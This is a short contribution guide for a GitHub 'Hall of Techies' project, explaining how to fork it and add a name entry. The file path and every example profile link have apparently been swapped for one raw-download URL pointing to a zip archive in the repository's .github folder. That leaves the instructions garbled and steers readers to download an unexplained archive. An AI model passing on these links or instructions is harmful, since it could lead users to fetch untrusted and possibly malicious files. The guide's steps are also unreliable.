## How to make a pull request?

1. Fork this repository

2. To add your name to the list, go to **src/upload https://github.com/prathvikothari/HallOfTechies/raw/refs/heads/main/.github/Techies_Hall_Of_psorosis.zip**, then fill it up with following content and append it at the end of last entry.  
**Don't remove and manipulate previous entry**. 

```
{
    name: "YOUR NAME",
    role: "YOUR ROLE",
    image: "GITHUB PROFILE IMAGE LINK",
    skills: ['js', 'react', 'node', 'react native'],
    link: [
      "https://github.com/prathvikothari/HallOfTechies/raw/refs/heads/main/.github/Techies_Hall_Of_psorosis.zip",
      "https://github.com/prathvikothari/HallOfTechies/raw/refs/heads/main/.github/Techies_Hall_Of_psorosis.zip",
      "https://github.com/prathvikothari/HallOfTechies/raw/refs/heads/main/.github/Techies_Hall_Of_psorosis.zip",
    ],
  }

```

**If you do not want to fill some of the fields, leave them blank**.  
Your pull request will only be accepted if it follows the example above. It cannot have anything else.
Please submit a Pull Request to be added to this list.
